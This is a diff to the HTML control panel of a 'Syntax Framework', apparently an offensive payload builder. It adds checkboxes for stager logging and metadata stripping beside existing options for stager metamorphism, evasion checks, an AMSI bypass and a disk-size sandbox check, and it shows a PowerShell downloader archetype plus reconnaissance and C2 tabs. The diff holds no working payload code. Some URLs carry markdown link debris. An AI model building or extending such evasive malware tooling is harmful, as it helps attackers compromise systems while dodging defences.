@@ -1,12 +1,16 @@
+<!-- File: CYBER_DASHBOARD_FRONTEND/index.html -->
+<!-- Координатор: Синтаксис -->
+<!-- Опис: Додано чекбокси для управління логуванням та метаданими стейджера. -->
 <!DOCTYPE html>
 <html lang="uk">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Syntax Framework - Контрольна Панель</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="css/style.css"> <style>
-        /* Мінімальні стилі, що були в gui.html, можна залишити тут або перенести в style.css */
+    <script src="[https://cdn.tailwindcss.com](https://cdn.tailwindcss.com)"></script>
+    <link rel="stylesheet" href="css/style.css"> 
+    <style>
+        /* ... (існуючі стилі залишаються без змін) ... */
         body { font-family: 'Inter', sans-serif; }
         .tab-button {
             padding: 0.75rem 1.0rem;
@@ -59,7 +63,7 @@
             border-color: #4B5563; /* gray-600 */
             background-color: #374151; /* gray-700 */
             color: #6366F1; /* indigo-500 */
-            accent-color: #6366F1; /* Для кращого вигляду чекбокса */
+            accent-color: #6366F1; 
         }
         .checkbox-label input[type="checkbox"]:focus {
             ring: 2px; 
@@ -170,7 +174,8 @@
                 </div>
 
                 <div id="archetypeParamsContainer" class="space-y-4">
-                    <div id="params_demo_echo_payload" class="form-section hidden p-4 bg-gray-700/50 rounded-lg border border-gray-600">
+                    <!-- ... (існуючі секції параметрів архетипів залишаються без змін) ... -->
+                     <div id="params_demo_echo_payload" class="form-section hidden p-4 bg-gray-700/50 rounded-lg border border-gray-600">
                         <h3 class="sub-header text-indigo-400">Параметри Ехо-Пейлоада</h3>
                         <div>
                             <label for="messageToEcho" class="text-gray-300">Повідомлення для Ехо:</label>
@@ -216,7 +221,7 @@
                         <h3 class="sub-header text-indigo-400">Параметри PowerShell Downloader</h3>
                         <div>
                             <label for="powershellScriptUrl" class="text-gray-300">URL PowerShell Скрипта (.ps1):</label>
-                            <input type="text" id="powershellScriptUrl" name="powershellScriptUrl" placeholder="https://example.com/script.ps1" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
+                            <input type="text" id="powershellScriptUrl" name="powershellScriptUrl" placeholder="[https://example.com/script.ps1](https://example.com/script.ps1)" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
                             <div id="error-powershellScriptUrl" class="error-message"></div>
                         </div>
                         <div>
@@ -285,26 +290,31 @@
                     </div>
                      <div>
                         <label class="text-gray-300 mb-2">Опції Генерації Пейлоада:</label>
-                        <div class="space-y-2">
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-x-4 gap-y-2">
                             <label class="checkbox-label text-gray-300">
-                                <input type="checkbox" id="enableStagerMetamorphism" name="enableStagerMetamorphism" checked class="form-checkbox">
+                                <input type="checkbox" id="enableStagerMetamorphism" name="enable_stager_metamorphism" checked class="form-checkbox">
                                 Увімкнути Метаморфізм Стейджера
                             </label>
                             <label class="checkbox-label text-gray-300">
-                                <input type="checkbox" id="enableEvasionChecks" name="enableEvasionChecks" checked class="form-checkbox">
+                                <input type="checkbox" id="enableEvasionChecks" name="enable_evasion_checks" checked class="form-checkbox">
                                 Увімкнути Перевірки Ухилення (загальні)
                             </label>
                             <label class="checkbox-label text-gray-300">
-                                <input type="checkbox" id="enableAmsiBypassConcept" name="enableAmsiBypassConcept" checked class="form-checkbox">
+                                <input type="checkbox" id="enableAmsiBypassConcept" name="enable_amsi_bypass_concept" checked class="form-checkbox">
                                 Увімкнути Концептуальний Обхід AMSI
                             </label>
                             <label class="checkbox-label text-gray-300">
-                                <input type="checkbox" id="enableDiskSizeCheck" name="enableDiskSizeCheck" checked class="form-checkbox">
+                                <input type="checkbox" id="enableDiskSizeCheck" name="enable_disk_size_check" checked class="form-checkbox">
                                 Увімкнути Перевірку Розміру Диска
                             </label>
+                            <!-- Нові чекбокси -->
                             <label class="checkbox-label text-gray-300">
-                                <input type="checkbox" id="enableStagerDebugPrints" name="enableStagerDebugPrints" class="form-checkbox">
-                                Увімкнути Debug Print у Стейджері
+                                <input type="checkbox" id="enableStagerLogging" name="enable_stager_logging" class="form-checkbox"> <!-- За замовчуванням вимкнено -->
+                                Увімкнути Логування в Стейджері (Debug)
+                            </label>
+                            <label class="checkbox-label text-gray-300">
+                                <input type="checkbox" id="stripStagerMetadata" name="strip_stager_metadata" checked class="form-checkbox"> <!-- За замовчуванням увімкнено -->
+                                Видалити Метадані/Коментарі зі Стейджера
                             </label>
                         </div>
                     </div>
@@ -323,6 +333,7 @@
             </div>
         </div>
 
+        <!-- ... (інші вкладки: reconnaissanceTab, c2ControlTab, loggingAdaptationTab залишаються без змін) ... -->
         <div id="reconnaissanceTab" class="tab-content">
              <h2 class="text-2xl font-semibold mb-4 text-teal-300">Модуль Розвідки</h2>
             <form id="reconForm" class="space-y-6">
